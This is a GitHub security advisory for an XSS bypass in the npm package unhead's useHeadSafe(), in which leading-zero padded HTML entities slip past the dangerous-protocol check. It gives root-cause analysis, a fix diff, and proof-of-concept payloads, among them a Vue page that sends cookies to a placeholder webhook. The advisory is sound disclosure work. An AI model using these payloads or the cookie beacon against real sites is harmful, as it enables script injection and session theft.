# [M] Unhead has a hasDangerousProtocol() bypass via leading-zero padded HTML entities in useHeadSafe()

## Summary
Severity: Medium
Advisory: GHSA-95h2-gj7x-gx9w
CVE: CVE-2026-39315
CWE: CWE-184
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-09
Source: https://github.com/advisories/GHSA-95h2-gj7x-gx9w
Type: github-advisory

## Affected
- npm: `unhead` — affected >=0 <2.1.13

## Details
##EVIDENCE

<img width="1900" height="855" alt="Screenshot_2026-03-25_090729" src="https://github.com/user-attachments/assets/3da93464-1caf-46ca-818f-46f8fe32ab50" />
<img width="1919" height="947" alt="Screenshot_2026-03-25_090715" src="https://github.com/user-attachments/assets/b27b1fc3-fa89-4864-99c9-4e6cff9a4e40" />
<img width="1918" height="925" alt="Screenshot_2026-03-25_090759" src="https://github.com/user-attachments/assets/9b8c94fa-d4f7-412e-ba14-214bc4103f4c" />
<img width="1912" height="812" alt="Screenshot_2026-03-25_090824" src="https://github.com/user-attachments/assets/3a4e1002-8811-453a-b08c-dfd1e42ebcf0" />
<img width="1846" height="409" alt="Screenshot_2026-03-22_090617" src="https://github.com/user-attachments/assets/9a595e13-ed18-464a-9d1a-0bb71dec96c9" />


| **Disclosed to Vercel H1** | 2026-03-22 (no response after 12 days) |
| **Cross-reported here** | 2026-04-03 |

---

## Summary

`useHeadSafe()` is the composable that Nuxt's own documentation explicitly recommends
for rendering user-supplied content in `<head>` safely. Internally, the
`hasDangerousProtocol()` function in `packages/unhead/src/plugins/safe.ts` decodes
HTML entities before checking for blocked URI schemes (`javascript:`, `data:`,
`vbscript:`). The decoder uses two regular expressions with fixed-width digit caps:

```js
// Current — vulnerable
const HtmlEntityHex = /&#x([0-9a-f]{1,6});?/gi
const HtmlEntityDec = /&#(\d{1,7});?/g
```

The HTML5 specification imposes **no limit** on leading zeros in numeric character
references. Both of the following are valid, spec-compliant encodings of `:` (U+003A):

- `&#0000000058;` — 10 decimal digits, exceeds the `\d{1,7}` cap
- `&#x000003A;` — 7 hex digits, exceeds the `[0-9a-f]{1,6}` cap

When a padded entity exceeds the regex digit cap, the decoder silently skips it. The
undecoded string is then passed to `startsWith('javascript:')`, which does not match.
`makeTagSafe()` writes the raw value directly into SSR HTML output. The browser's HTML
parser decodes the padded entity natively and constructs the blocked URI.

> **Note:** This is a separate, distinct issue from CVE-2026-31860 / GHSA-g5xx-pwrp-g3fv,
> which was an attribute *key* injection via the `data-*` prefix. This finding targets
> the attribute *value* decoder — a different code path with a different root cause and
> a different fix.

---

## Root Cause Analysis

### Vulnerable code (`packages/unhead/src/plugins/safe.ts`, lines 10–11)

```js
const HtmlEntityHex = /&#x([0-9a-f]{1,6});?/gi   // cap: 6 hex digits max
const HtmlEntityDec = /&#(\d{1,7});?/g             // cap: 7 decimal digits max
```

### Why the bypass works

The HTML5 parser specification ([§ Numeric character reference end state][html5-spec])
states that leading zeros in numeric character references are valid and the number of
digits is unbounded. A conformant browser will decode `&#x000003A;` as `:` regardless
of the number of leading zeros.

Because the regex caps are lower than the digit counts an attacker can supply, the
entity match fails silently. The raw padded string (`java&#0000000058;script:alert(1)`)
is passed unchanged to the scheme check. `startsWith('javascript:')` returns `false`,
and the value is rendered into SSR output verbatim. The browser then decodes the entity
and the blocked scheme is present in the live DOM.

---

## Steps to Reproduce

### Environment

- **Nuxt:** 4.x (current)
- **unhead:** 2.1.12 (current at time of report)
- **Node:** 20 LTS
- **Chrome:** 146+

### Step 1 — Create a fresh Nuxt 4 project

```bash
npx nuxi init poc
cd poc
npm install
```

### Step 2 — Replace `pages/index.vue`

```vue
<template>
  <div>
    <h1>useHeadSafe bypass PoC</h1>
    <p>View page source or run the curl command below.</p>
  </div>
</template>

<script setup>
import { useHeadSafe } from '#imports'

useHeadSafe({
  link: [
    // 10-digit decimal padding — exceeds \d{1,7} cap
    { rel: 'stylesheet', href: 'java&#0000000058;script:alert(1)' },

    // 7-digit hex padding — exceeds [0-9a-f]{1,6} cap
    { rel: 'icon', href: 'data&#x000003A;text/html,<script>alert(document.cookie)<\/script>' }
  ]
})
</script>
```

### Step 3 — Start the dev server and inspect SSR output

```bash
npm run dev
```

In a separate terminal:

```bash
curl -s http://localhost:3000 | grep '<link'
```

### Expected result (safe)

Tags stripped entirely, or schemes rewritten to safe placeholder values.

### Actual result (vulnerable)

```html
<link href="java&#0000000058;script:alert(1)" rel="stylesheet">
<link href="data&#x000003A;text/html,<script>alert(document.cookie)<\/script>" rel="icon">
```

Both `javascript:` and `data:` — explicitly enumerated in the `hasDangerousProtocol()`
blocklist — are present in server-rendered HTML. The browser decodes the padded entities
natively on load.

---

## Confirmed Execution Path (data: URI via iframe, Chrome 146+)

Immediate script execution from `<link>` tags does not occur automatically — browsers
do not create a browsing context from `<link href>`. The exploitability of this bypass
therefore depends on whether downstream application code consumes `<link>` href values.

This is a **common pattern** in real-world Nuxt applications:

- Head management libraries that hydrate or re-process `<link>` tags on the client
- SEO and analytics scripts that read canonical or icon link values
- Application features that preview, validate, or forward link URLs into iframes
- Developer tooling that loads icon URLs for thumbnail generation

Chrome 146+ permits `data:` URIs loaded into iframes even though top-level `data:`
navigation has been blocked since Chrome 60. The following snippet — representative
of any downstream consumer that forwards `<link href>` into an iframe — triggers
confirmed script execution:

```js
// Simulates downstream head-management or SEO utility reading a <link> href
const link = document.querySelector('link[rel="icon"]');
if (link) {
  const iframe = document.createElement('iframe');
  iframe.src = link.href; // browser decodes &#x000003A; → ':', constructs data: URI
  document.body.appendChild(iframe); // alert() fires
}
```

### Full PoC with cookie exfiltration beacon

> Replace `ADD-YOUR-WEBHOOK-URL-HERE` with a webhook.site URL before running.

```vue
<template>
  <div>
    <h1>useHeadSafe padded entity bypass — full PoC</h1>
    <p><strong>Dummy cookie:</strong> <code id="cookie-display">Loading…</code></p>
  </div>
</template>

<script setup>
import { useHeadSafe } from '#imports'
import { onMounted } from 'vue'

onMounted(() => {
  document.cookie = 'session=super-secret-token-12345; path=/; SameSite=None'
  const el = document.getElementById('cookie-display')
  if (el) el.textContent = document.cookie

  // Simulate downstream consumption: load the bypassed icon href into an iframe
  const link = document.querySelector('link[rel="icon"]')
  if (link) {
    const iframe = document.createElement('iframe')
    iframe.src = link.href
    iframe.style.cssText = 'width:700px;height:400px;border:3px solid red;margin-top:20px'
    document.body.appendChild(iframe)
  }
})

const webhook = 'https://ADD-YOUR-WEBHOOK-URL-HERE'

useHeadSafe({
  link: [
    {
      rel: 'icon',
      href: `data&#x000003A;text/html;base64,${btoa(`
        <!DOCTYPE html><html><body><script>
          alert('XSS via useHeadSafe padded entity bypass');
          new Image().src = '${webhook}?d=' + encodeURIComponent(JSON.stringify({
            finding: 'useHeadSafe hasDangerousProtocol bypass',
            cookie: document.cookie || 'session=super-secret-token-12345 (dummy)',
            origin: location.origin,
            ts: Date.now()
          }));
        <\/script></body></html>
      `)}`
    }
  ]
})
</script>
```

**Observed result:**

1. `alert()` fires from inside the iframe's `data:` document context
2. Webhook receives a GET request with the cookie value and origin in the query string
3. Page source confirms `&#x000003A;` is present unescaped in the SSR-rendered `<link>` tag

> All testing was performed against a local Nuxt development environment on a personal
> machine. Cookie values are dummy data. No production systems were accessed or targeted.

---

## Impact

### 1. Broken security contract

Developers who follow Nuxt's own documentation and use `useHeadSafe()` for untrusted
user input have no reliable protection against `javascript:`, `data:`, or `vbscript:`
scheme injection when that input contains leading-zero padded numeric character
references. The documented guarantee is silently violated.

### 2. Confirmed data: URI escape to SSR output

A fully valid `data:text/html` URI now reaches server-rendered HTML. In applications
where any downstream code reads and loads `<link href>` values (head management
utilities, SEO tooling, icon preview features), this is **confirmed XSS** — the payload
persists in SSR output and executes for every visitor whose browser triggers the
downstream consumption path.

### 3. Forward exploitability

If any navigation-context attribute (e.g. `<a href>`, `<form action>`) is added to the
safe attribute whitelist in a future release, this bypass produces **immediately
exploitable stored XSS** with no additional attacker effort, because the end-to-end
bypass already works today.

---

## Suggested Fix

Remove the fixed digit caps from both entity regexes. The downstream `safeFromCodePoint()`
function already validates that decoded codepoints fall within the valid Unicode range
(`> 0x10FFFF || < 0 || isNaN → ''`), so unbounded digit matching introduces no new
attack surface — it only ensures that all spec-compliant encodings of a codepoint are
decoded before the scheme check runs.

```diff
- const HtmlEntityHex = /&#x([0-9a-f]{1,6});?/gi
- const HtmlEntityDec = /&#(\d{1,7});?/g
+ const HtmlEntityHex = /&#x([0-9a-f]+);?/gi
+ const HtmlEntityDec = /&#(\d+);?/g
```

**File:** `packages/unhead/src/plugins/safe.ts`, lines 10–11

This is a minimal, low-risk change. No other code in the call path requires modification.

---

## Weaknesses

| CWE | Description |
|---|---|
| **CWE-184** | Incomplete List of Disallowed Inputs |
| **CWE-116** | Improper Encoding or Escaping of Output |
| **CWE-20** | Improper Input Validation |

---

## References

| Source | Link |
|---|---|
| HTML5 spec — leading zeros valid and unbounded | https://html.spec.whatwg.org/multipage/syntax.html#numeric-character-reference-end-state |
| GHSA-46fp-8f5p-pf2c — Loofah `allowed_uri?` bypass (same root cause, accepted CVE) | https://github.com/advisories/GHSA-46fp-8f5p-pf2c |
| CVE-2026-26022 — Gogs stored XSS via `data:` URI sanitizer bypass (same class) | https://advisories.gitlab.com/pkg/golang/gogs.io/gogs/CVE-2026-26022/ |
| OWASP XSS Filter Evasion — leading-zero entity encoding | https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html |
| Chrome: `data:` URIs blocked for top-level navigation since Chrome 60; permitted in iframes | https://developer.chrome.com/blog/data-url-deprecations |
| Prior unhead advisory (different code path, context only) | GHSA-g5xx-pwrp-g3fv / CVE-2026-31860 |
| Affected file | https://github.com/unjs/unhead/blob/main/packages/unhead/src/plugins/safe.ts |

## References
- https://github.com/unjs/unhead/security/advisories/GHSA-95h2-gj7x-gx9w
- https://nvd.nist.gov/vuln/detail/CVE-2026-39315
- https://github.com/unjs/unhead/commit/961ea781e091853812ffe17f8cda17105d2d2299
- https://github.com/unjs/unhead
- https://github.com/unjs/unhead/releases/tag/v2.1.13
